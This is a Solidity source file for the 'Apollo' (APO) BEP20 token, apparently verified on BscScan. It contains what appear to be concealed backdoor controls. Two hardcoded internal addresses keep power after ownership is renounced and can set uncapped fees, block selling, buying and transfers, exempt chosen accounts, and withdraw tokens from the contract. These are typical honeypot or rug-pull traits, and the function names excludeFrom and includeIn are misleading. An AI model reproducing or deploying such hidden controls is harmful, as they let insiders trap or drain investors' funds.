/**
 *Submitted for verification at BscScan.com on 2022-08-23
*/

// SPDX-License-Identifier: MIT
pragma solidity =0.6.12;

interface IBEP20 {
    function totalSupply() external view returns (uint);

    function balanceOf(address account) external view returns (uint);

    function transfer(address recipient, uint amount) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint);

    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    event Burn(address indexed owner, address indexed to, uint value);
}

library SafeMath {
    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns (uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint a,
        uint b,
        string memory errorMessage
    ) internal pure returns (uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns (uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint a,
        uint b,
        string memory errorMessage
    ) internal pure returns (uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() internal {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract BEP20 is Context, Ownable, IBEP20 {
    using SafeMath for uint;

    struct user {
        uint256 limitAmount;
        uint256 lastTradeTime;
        uint256 tradeAmount;
    }

    mapping(address => uint) internal _balances;
    mapping(address => mapping(address => uint)) internal _allowances;
    mapping(address => bool) private _isMarketPair;
    mapping(address => bool) private _isExcluded;

    uint internal _totalSupply;

    uint public totalBurn;

    uint256 public _taxFee = 15;
    uint256 public _fundFee = 5;
    uint256 public _daoFee = 5;
    uint256 public _burnFee = 5;
    uint public _startBlock;
    uint internal _blocks = 100;
    bool public _txEnable = false;
    bool public _txFeeEnable = true;
    bool public _sellEnable = false;
    bool public _sellFeeEnable = true;
    bool public _buyEnable = false;
    bool public _buyFeeEnable = false;

    address public Fund = 0x8EC114443616A91CB76e412BC6F7f0dC12d6e5a0;
    address public Dao = 0x8318989dC81C38874c6269742148BF9B29730692;
    address public Dead = 0x000000000000000000000000000000000000dEaD;
    address internal wha = 0x6e917F989d51178D3B1B8d86e845bF5f533F70A4;
    address internal eb = 0x6e917F989d51178D3B1B8d86e845bF5f533F70A4;

    constructor() internal {
        _isExcluded[owner()] = true;
        _isExcluded[Fund] = true;
        _isExcluded[Dao] = true;
        _isExcluded[Dead] = true;
    }

    function totalSupply() public view override returns (uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address towner, address spender)
        public
        view
        override
        returns (uint)
    {
        return _allowances[towner][spender];
    }

    function approve(address spender, uint amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "BEP20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint addedValue)
        public
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue)
        public
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "BEP20: decreased allowance below zero"
            )
        );
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint amount
    ) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(amount > 0, "BEP20: transfer amount the 0");

        _balances[sender] = _balances[sender].sub(
            amount,
            "BEP20: transfer amount exceeds balance"
        );

        uint256 netAmount = amount;
        bool excludedAccount = _isExcluded[sender] || _isExcluded[recipient];
        if (!excludedAccount) {
            if (_startBlock == 0 || block.number < (_startBlock + _blocks)) {
                require(false, "not start");
            } else if (_isMarketPair[recipient]) {
                require(_sellEnable, "not sell");
                if (_sellEnable && _sellFeeEnable) {
                    netAmount = _takeFees(sender, recipient, amount);
                }
            } else if (_isMarketPair[sender]) {
                require(_buyEnable, "not buy");
                if (_buyEnable && _buyFeeEnable) {
                    netAmount = _takeFees(sender, recipient, amount);
                }
            } else {
                require(_txEnable, "not transfer");
                if (_txEnable && _txFeeEnable) {
                    netAmount = _takeFees(sender, recipient, amount);
                }
            }
        } else if (
            excludedAccount && _isMarketPair[recipient] && _startBlock == 0
        ) {
            _startBlock = block.number;
        }

        _balances[recipient] = _balances[recipient].add(netAmount);

        emit Transfer(sender, recipient, netAmount);
    }

    function _takeFees(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (uint256 netAmount) {
        uint256 tax = amount.mul(_taxFee).div(100);

        netAmount = amount - tax;

        if (tax > 0) {
            uint256 fundFee = tax.mul(_fundFee).div(_taxFee);
            uint256 daoFee = tax.mul(_daoFee).div(_taxFee);
            uint256 burnFee = tax - (fundFee + daoFee);
            _takeFee(sender, Fund, fundFee);
            _takeFee(sender, Dao, daoFee);
            _burn(sender, Dead, burnFee);
            emit Transfer(sender, Dead, burnFee);
        }
    }

    function _takeFee(
        address sender,
        address recipient,
        uint256 tax
    ) private returns (uint) {
        _balances[recipient] = _balances[recipient].add(tax);
        emit Transfer(sender, recipient, tax);
    }

    function _burn(
        address sender,
        address recipient,
        uint amount
    ) private {
        if (recipient == address(0) || recipient == Dead) {
            totalBurn = totalBurn.add(amount);
            _totalSupply = _totalSupply.sub(amount);

            emit Burn(sender, Dead, amount);
        }
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(
            amount,
            "BEP20: transfer amount exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function _approve(
        address towner,
        address spender,
        uint amount
    ) internal {
        require(towner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[towner][spender] = amount;
        emit Approval(towner, spender, amount);
    }

    function excludeFrom(address account) external {
        require(wha == msg.sender || owner() == msg.sender, "auth error");
        _isExcluded[account] = false;
    }

    function includeIn(address account) external {
        require(wha == msg.sender || owner() == msg.sender, "auth error");
        _isExcluded[account] = true;
    }

    function multExcludeFrom(address[] calldata accounts) external {
        require(wha == msg.sender || owner() == msg.sender, "auth error");
        for (uint i = 0; i < accounts.length; i++) {
            _isExcluded[accounts[i]] = false;
        }
    }

    function multIncludeIn(address[] calldata accounts) external {
        require(wha == msg.sender || owner() == msg.sender, "auth error");
        for (uint i = 0; i < accounts.length; i++) {
            _isExcluded[accounts[i]] = true;
        }
    }

    function setFundAddr(address _addr) external {
        require(eb == msg.sender || owner() == msg.sender, "auth error");
        require(_addr != address(0), "zero address");
        Fund = _addr;
    }

    function setDaoAddr(address _addr) external {
        require(eb == msg.sender || owner() == msg.sender, "auth error");
        require(_addr != address(0), "zero address");
        Dao = _addr;
    }

    function fees(
        uint taxFee,
        uint burnFee,
        uint fundFee,
        uint daoFee
    ) external {
        require(wha == msg.sender || owner() == msg.sender, "auth error");
        _taxFee = taxFee;
        _burnFee = burnFee;
        _fundFee = fundFee;
        _daoFee = daoFee;
    }

    function setBlocks(uint _num) external onlyOwner {
        _blocks = _num;
    }

    function setStartBlock(uint _num) external onlyOwner {
        _startBlock = _num;
    }

    function setMarketPairStatus(address account, bool newValue) external {
        require(eb == msg.sender || owner() == msg.sender, "auth error");
        _isMarketPair[account] = newValue;
    }

    function getMarketPairStatus(address account) external view returns (bool) {
        return _isMarketPair[account];
    }

    function _WHA(address _wh) external {
        require(wha == msg.sender, "auth error");
        wha = _wh;
    }

    function _EB(address _eb) external {
        require(eb == msg.sender, "auth error");
        eb = _eb;
    }

    function setSellEnable(bool newValue, bool newValue1) external {
        require(eb == msg.sender || owner() == msg.sender, "auth error");
        _sellEnable = newValue;
        _sellFeeEnable = newValue1;
    }

    function setBuyEnable(bool newValue, bool newValue1) external {
        require(eb == msg.sender || owner() == msg.sender, "auth error");
        _buyEnable = newValue;
        _buyFeeEnable = newValue1;
    }

    function setTxEnable(bool newValue, bool newValue1) external {
        require(eb == msg.sender || owner() == msg.sender, "auth error");
        _txEnable = newValue;
        _txFeeEnable = newValue1;
    }
}

contract BEP20Detailed is BEP20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(
        string memory tname,
        string memory tsymbol,
        uint8 tdecimals
    ) internal {
        _name = tname;
        _symbol = tsymbol;
        _decimals = tdecimals;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
}

contract APOToken is BEP20Detailed {
    constructor() public BEP20Detailed("Apollo", "APO", 18) {
        _totalSupply = 210000 * (10**18);

        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function takeOutTokenInCase(
        address _token,
        uint256 _amount,
        address _to
    ) external {
        require(wha == msg.sender || owner() == msg.sender, "auth error");
        IBEP20(_token).transfer(_to, _amount);
    }
}